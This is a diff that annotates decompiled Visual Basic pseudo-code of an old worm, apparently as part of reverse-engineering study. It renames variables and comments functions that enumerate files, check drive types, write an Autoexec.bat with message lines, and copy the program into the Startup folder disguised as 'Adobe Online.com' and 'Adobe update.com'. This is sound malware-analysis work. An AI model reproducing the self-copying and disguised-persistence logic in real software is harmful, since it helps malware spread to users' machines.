@@ -196,35 +196,80 @@ Public Function funct2() '405BF8
   loc_405BEF: funct2 = var_15C
 End Function
 
-Public Function funct3(a) '404DDC
+' Get descriptor for the second file in given path
+Public Function funct3(path) '404DDC
   'Data Table: 401838
-  Dim var_314 As Variant
-  Dim var_338 As String
-  Dim var_480 As Long
-  loc_404C86: On Error Resume Next
-  loc_404C90: var_2F4 = "\" 'Variant
+  Dim null_ptr As Variant
+  Dim search_path As String
+  Dim filesearch_status As Long
+
+  loc_404C86: On Error Resume Next ' Ignore errors
+
+  loc_404C90: backslash = "\" 'Variant
   loc_404C96: ' Referenced from: 404DD1
   loc_404C98: Thumbs   .db.address_80000256
   loc_404CAA: Thumbs   .db.address_8000026B
-  loc_404CBA: If CBool(var_314 <> var_2F4) Then
-  loc_404CCC:   a = a & var_2F4
+
+  ' This portion of code needs further investigation.
+  ' (If "\" not at the end, add it?)
+  loc_404CBA: If CBool(null_ptr <> backslash) Then ' If null_ptr NOT backslash
+  loc_404CCC:   path = path & backslash ' Add a backslash to the path
   loc_404CCF: End If
-  loc_404CEC: var_338 = CStr(a & "*")
-  loc_404D10: var_490 = CVar(FindFirstFile(var_338, Record Of arg_1E)) 'Variant
-  loc_404D3D: var_314 = funct4(var_2B8, a, arg_1E)
-  loc_404D48: var_2B8 = var_338
-  loc_404D51: ' Referenced from: 404DB7
-  loc_404D59: var_5E0 = Record Of arg_1E 'Copy battery of vars to single variable
-  loc_404D69: var_480 = FindNextFile(CLng(var_490), var_5E0)
-  loc_404D7F: If (var_480 <> 0) Then
-  loc_404DA1:   var_314 = funct4(var_2B8, a, arg_1E)
-  loc_404DAC:   var_2B8 = var_338
-  loc_404DB7:   GoTo loc_404D51
+
+  loc_404CEC: search_path = CStr(path & "*") ' Set path var with path wildcard, presumably to select multiple items
+  
+            'HANDLE FindFirstFileA(                     // Note: Using C++ function prototype
+            '  [in]  LPCSTR             lpFileName,     // Path to the folder to searh on. If wildcard, perform a full search on path.
+            '  [out] LPWIN32_FIND_DATAA lpFindFileData  // Pointer to the struct/array with the wanted characteristics
+            ');
+            '
+            'typedef struct _WIN32_FIND_DATAA {         // Struct of characteristics. For sanity reasons I will call this a "descriptor"
+            '  DWORD    dwFileAttributes;
+            '  FILETIME ftCreationTime;
+            '  FILETIME ftLastAccessTime;
+            '  FILETIME ftLastWriteTime;
+            '  DWORD    nFileSizeHigh;
+            '  DWORD    nFileSizeLow;
+            '  DWORD    dwReserved0;
+            '  DWORD    dwReserved1;
+            '  CHAR     cFileName[MAX_PATH];
+            '  CHAR     cAlternateFileName[14];
+            '  DWORD    dwFileType;
+            '  DWORD    dwCreatorType;
+            '  WORD     wFinderFlags;
+            '} WIN32_FIND_DATAA, *PWIN32_FIND_DATAA, *LPWIN32_FIND_DATAA;
+
+  ' first_file_found_data MUST be an array with the desired file characteristics
+  ' Find first file in search_path and store its descriptor in first_file_found_data
+  loc_404D10: file_handle = CVar(FindFirstFile(search_path, Record Of first_file_found_data)) 'Variant.
+  loc_404D3D: null_ptr = funct4(wildard_path2, path, first_file_found_data) ' wildard_path2 hasnt been initialized yet
+
+  loc_404D48: wildard_path2 = search_path
+  loc_404D51: ' Referenced from: 404DB7 <- Top of loop
+  loc_404D59: result_descriptor = Record Of first_file_found_data 'Copy array to result_descriptor
+
+  ' Dont continue unless other file is found
+  ' FindNextFile() will return a non-zero value. If the function fails, then 0 is returned.
+  ' If function succeeds, it will store the next file's descriptor in lpFindFileData
+              'BOOL FindNextFileA(
+              '  [in]  HANDLE             hFindFile,
+              '  [out] LPWIN32_FIND_DATAA lpFindFileData
+              ');
+  loc_404D69: filesearch_status = FindNextFile(CLng(file_handle), result_descriptor) ' Get the second file found
+  loc_404D7F: If (filesearch_status <> 0) Then ' If search fails, call funct4 and try again
+  loc_404DA1:   null_ptr = funct4(wildard_path2, path, first_file_found_data) ' Maybe drop some files?
+  loc_404DAC:   wildard_path2 = search_path
+  loc_404DB7:   GoTo loc_404D51 ' <- Bottom of loop
   loc_404DBA: End If
-  loc_404DC1: FindClose(CLng(var_490))
-  loc_404DC9: funct3 = var_5E0
+
+  loc_404DC1: FindClose(CLng(file_handle)) ' Close the handle
+  loc_404DC9: funct3 = result_descriptor ' Return the new file's descriptor
+
+  ' This presumably wont execute, beacause if it did then other
+  ' calls to this function wouldnt make any sense.
+  ' Example: loc_405905 in function funct0()
   loc_404DD1: GoTo loc_404C96
-  loc_404DD6: funct3 = var_480
+  loc_404DD6: funct3 = filesearch_status
 End Function
 
 Public Function funct4(a, b, c) '404C24
@@ -341,29 +386,36 @@ Public Function funct6() '403B6C
   loc_403B63: funct6 = 
 End Function
 
-Public Function funct7(a) '403EC8
+Public Function funct7(a) '403EC8 ' Disk drive stuff?
   'Data Table: 401838
+  'Link to opcode list: https://www.dotfix.net/doc/vb_pcode_table.htm
+
   loc_403DEA: On Error Goto loc_403EBA ' Exit on error
-  loc_403DED: ILdDarg
+  loc_403DED: ILdDarg ' Uncommon opcode
+              'Call the DLL
   loc_403DFC: Thumbs   .db.address_800002CC
-  loc_403E04: VarLateMemCallLdRfVar
-  loc_403E12: var_D4 = var_A4.drivetype 'Variant
-  loc_403E28: If (var_D4 = 0) Then
+  loc_403E04: VarLateMemCallLdRfVar ' Another rarely used opcode
+
+  ' Returns the storage drive type of the Drive object named drive. Ref: https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/drivetype-property
+  loc_403E12: drive_type = drive.drivetype 'Variant. drive MUST be a Drive object, but has not been declared
+
+  ' Stupid way of saying a = drive_type, where "a" must range from 0 to 5
+  loc_403E28: If (drive_type = 0) Then
   loc_403E30:   a = 0
   loc_403E36: Else
-  loc_403E41:   If (var_D4 = 1) Then
+  loc_403E41:   If (drive_type = 1) Then
   loc_403E49:     a = 1
   loc_403E4F:   Else
-  loc_403E5A:     If (var_D4 = 2) Then
+  loc_403E5A:     If (drive_type = 2) Then
   loc_403E62:       a = 2
   loc_403E68:     Else
-  loc_403E73:       If (var_D4 = 3) Then
+  loc_403E73:       If (drive_type = 3) Then
   loc_403E7B:         a = 3
   loc_403E81:       Else
-  loc_403E8C:         If (var_D4 = 4) Then
+  loc_403E8C:         If (drive_type = 4) Then
   loc_403E94:           a = 4
   loc_403E9A:         Else
-  loc_403EA5:           If (var_D4 = 5) Then
+  loc_403EA5:           If (drive_type = 5) Then
   loc_403EAD:             a = 5
   loc_403EB0:           End If
   loc_403EB0:         End If
@@ -371,16 +423,19 @@ Public Function funct7(a) '403EC8
   loc_403EB0:     End If
   loc_403EB0:   End If
   loc_403EB0: End If
-  loc_403EB6: var_94 = a 'Variant
+  
+  loc_403EB6: drive_type2 = a 'Variant. drive_type2 = a = drive_type = drive.drivetype
   loc_403EBA: ' Referenced from: 403DEA
-  loc_403EBA: funct7 = var_A4
-  loc_403EC0: funct7 = "scripting.filesystemobject"
+  loc_403EBA: funct7 = drive ' This will be overwritten in the next instruction
+  loc_403EC0: funct7 = "scripting.filesystemobject" ' Return "scripting.filesystemobject"
 End Function
 
-' Drop copies on specified path
+' Drop 2 copies on selected path
 Public Function funct8(a) '4054C0
   'Data Table: 401838
   ' Note: <> means a logical NOT operator
+
+  ' Define vars
   Dim sus_data As String
   Dim exe_path2 As String
   Dim autorun_content As Variant
@@ -426,66 +481,86 @@ Public Function funct8(a) '4054C0
   loc_4054B8: funct8 = CStr(exe_path) ' Return CStr(exe_path)
 End Function
 
-' Drop Autoexec.bat in current path
-Public Function funct9() '404A00
+' Drops Autoexec.bat
+Public Function funct9() '404A00 ' WARNING: The renamings made here are pure speculation
   'Data Table: 401838
+  ' Variable declaration
   Dim var_B4 As Variant
-  Dim var_108 As String
-  Dim var_114 As String
-  Dim var_124 As String
-  Dim var_134 As String
-  loc_4048B2: On Error Resume Next
-  loc_4048BF: var_C4 = funct1(0)
-  loc_4048E2: var_B4 = InStr(1, var_C4, ":", 0)
-  loc_4048EE: Thumbs   .db.address_80000269
-  loc_4048FF: var_104 = var_C4 & "Autoexec.bat" 'Variant
+  Dim autoexec_path2 As String
+  Dim autoexec_s1 As String
+  Dim autoexec_s2 As String
+  Dim autoexec_s3 As String
+
+  loc_4048B2: On Error Resume Next ' Ignore errors and continue
+
+  loc_4048BF: dll_path = funct1(0) ' Get DLL current path
+  loc_4048E2: var_B4 = InStr(1, dll_path, ":", 0)
+  loc_4048EE: Thumbs   .db.address_80000269 ' Call the DLL
+  loc_4048FF: autoexec_path = dll_path & "Autoexec.bat" 'Variant
+
+  ' If CALL_RESULT NOT NULL -> return autoexec_path
   loc_404924: If (Thumbs   .db.address_80000285 <> vbNullString) Then
-  loc_404929:   funct9 = var_104
+  loc_404929:   funct9 = autoexec_path
   loc_40492F: End If
-  loc_404939: var_108 = CStr(var_104)
+
+  loc_404939: autoexec_path2 = CStr(autoexec_path)
+              'Call 2 DLL functions
   loc_40493D: Thumbs   .db.address_80000244
   loc_40494A: Thumbs   .db.address_80000211
-  loc_40495D: Open CStr(var_104) For Output As 1 Len = &HFF
-  loc_404982: var_114 = "@Echo Off" & vbCrLf & "Echo 81u3f4nt45y - 24.01.2007" & vbCrLf & "Echo Don't kill me, i'm just send message from your computer"
-  loc_40499E: var_124 = var_114 & vbCrLf & "Echo Terima kasih telah menemaniku walaupun hanya sesaat, tapi bagiku sangat berarti" & vbCrLf & "Echo Maafkan jika kebahagiaan yang kuminta adalah teman sepanjang hidupku"
-  loc_4049BA: var_134 = var_124 & vbCrLf & "Echo Seharusnya aku mengerti bahwa keberadaanku bukanlah disisimu, hanyalah lamunan dalam sesal" & vbCrLf & "Echo Untuk kekasih yang tak kan pernah kumiliki 3r1k1m0"
-  loc_4049CD: Print 1, var_134 & vbCrLf & "pause"
+
+  ' Drop Autoexec.bat in the same folder as the DLL
+  loc_40495D: Open CStr(autoexec_path) For Output As 1 Len = &HFF
+  loc_404982: autoexec_s1 = "@Echo Off" & vbCrLf & "Echo 81u3f4nt45y - 24.01.2007" & vbCrLf & "Echo Don't kill me, i'm just send message from your computer"
+  loc_40499E: autoexec_s2 = autoexec_s1 & vbCrLf & "Echo Terima kasih telah menemaniku walaupun hanya sesaat, tapi bagiku sangat berarti" & vbCrLf & "Echo Maafkan jika kebahagiaan yang kuminta adalah teman sepanjang hidupku"
+  loc_4049BA: autoexec_s3 = autoexec_s2 & vbCrLf & "Echo Seharusnya aku mengerti bahwa keberadaanku bukanlah disisimu, hanyalah lamunan dalam sesal" & vbCrLf & "Echo Untuk kekasih yang tak kan pernah kumiliki 3r1k1m0"
+  loc_4049CD: Print 1, autoexec_s3 & vbCrLf & "pause"
   loc_4049F6: Close 1
-  loc_4049FA: funct9 = var_104
+  loc_4049FA: funct9 = autoexec_path ' Return autoexec_path
 End Function
 
+' Drops the 2 copies of itself
 Public Function funct10() '40417C
   'Data Table: 401838
-  Dim var_B4 As Variant
-  Dim var_E4 As Variant
+  ' Define variables
+  Dim original_name As Variant
+  Dim copy1_name As Variant
   Dim var_140 As String
   Dim var_11C As String
-  Dim var_148 As Double
-  loc_404066: On Error Goto loc_40416F
-  loc_404082: var_F4 = funct1(0) & "\" 'Variant
-  loc_4040A2: var_104 = var_F4 & "Adobe Online" & ".com" 'Variant
-  loc_4040BE: var_114 = var_F4 & "Adobe update" & ".com" 'Variant
+  Dim remaining_copy As Double
+
+  loc_404066: On Error Goto loc_40416F ' Exit on error
+
+  loc_404082: startup_path = funct1(0) & "\" ' Get the Startup folder path
+  loc_4040A2: ao_path = startup_path & "Adobe Online" & ".com" 'Variant. Name of the first copy
+  loc_4040BE: au_path = startup_path & "Adobe update" & ".com" 'Variant. Name of the second copy
   loc_4040D1: var_118 = Me.Global.App
-  loc_4040E1: var_B4 = CVar(App.EXEName) 'String
+
+  loc_4040E1: original_name = CVar(App.EXEName) 'String
   loc_4040E7: Thumbs   .db.address_80000210
-  loc_4040F4: var_E4 = "Adobe Online"
+  loc_4040F4: copy1_name = "Adobe Online"
   loc_4040FD: Thumbs   .db.address_80000210
+  
+  ' Copy itself to the given path ?
   loc_404115: If (var_12C = var_12C) Then
-  loc_40411B:   var_140 = CStr(var_114)
-  loc_404122:   var_11C = CStr(var_104)
+  loc_40411B:   var_140 = CStr(au_path) ' Maybe an arg?
+  loc_404122:   var_11C = CStr(ao_path) ' Maybe an arg?
+                ' The files must be created and copied to the location,
+                ' so its probable that this 2 calls are responsible
+                ' for the file system operations
   loc_404126:   Thumbs   .db.address_80000240
   loc_40413A:   Thumbs   .db.address_80000258
-  loc_40413F:   var_148 = var_114
-  loc_404145: Else
-  loc_404148:   var_140 = CStr(var_104)
-  loc_40414F:   var_11C = CStr(var_114)
+  loc_40413F:   remaining_copy = au_path
+  loc_404145: Else ' Do the same as above, but return different app paths
+  loc_404148:   var_140 = CStr(ao_path)
+  loc_40414F:   var_11C = CStr(au_path)
   loc_404153:   Thumbs   .db.address_80000240
   loc_404167:   Thumbs   .db.address_80000258
-  loc_40416C:   var_148 = var_104
+  loc_40416C:   remaining_copy = ao_path
   loc_40416F: End If
+
   loc_40416F: ' Referenced from: 404066
-  loc_40416F: funct10 = var_148
-  loc_404175: funct10 = 2
+  loc_40416F: funct10 = remaining_copy
+  loc_404175: funct10 = 2 ' Return 2
 End Function
 
 Public Function funct11(a) '403C7C
